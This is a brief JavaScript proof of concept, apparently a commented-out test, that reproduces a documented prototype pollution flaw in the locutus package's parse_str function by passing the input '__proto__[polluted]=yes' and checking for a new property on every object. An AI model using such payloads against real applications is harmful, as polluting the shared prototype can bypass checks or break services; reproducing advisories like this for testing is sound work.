// //https://snyk.io/vuln/SNYK-JS-LOCUTUS-598675
// test("prototype pollution in locutus", () => {
console.log({}.polluted);
const locutus = require("locutus");
locutus.php.strings.parse_str("__proto__[polluted]=yes");
console.log({}.polluted);
// });
